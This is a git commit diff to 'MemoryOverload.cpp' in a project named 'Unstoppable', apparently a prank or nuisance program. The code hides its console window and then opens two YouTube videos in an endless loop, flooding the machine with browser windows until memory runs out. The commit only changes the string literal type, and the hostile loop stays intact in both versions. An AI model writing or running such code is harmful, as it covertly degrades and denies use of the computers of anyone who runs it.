faf8fbcfc6b18e203ee7e6df0c82a9460a3ae45c
Theraneatic <theraneatic@gmail.com>
2018-11-18 01:14:06 -0800

    Update MemoryOverload.cpp

--- Unstoppable/MemoryOverload.cpp
+++ Unstoppable/MemoryOverload.cpp
@@ -6,8 +6,8 @@ int main()
 	bool truth = true;
 	FreeConsole();
 	while (truth == true) {
-		ShellExecute(0, 0, L"https://www.youtube.com/watch?v=vS43ZgcQ_hE", 0, 0, SW_SHOW);
-		ShellExecute(0, 0, L"https://www.youtube.com/watch?v=BiGTx8d2zdU", 0, 0, SW_SHOW);
+		ShellExecute(0, 0, "https://www.youtube.com/watch?v=vS43ZgcQ_hE", 0, 0, SW_SHOW);
+		ShellExecute(0, 0, "https://www.youtube.com/watch?v=BiGTx8d2zdU", 0, 0, SW_SHOW);
 	}
     return 0;
 }
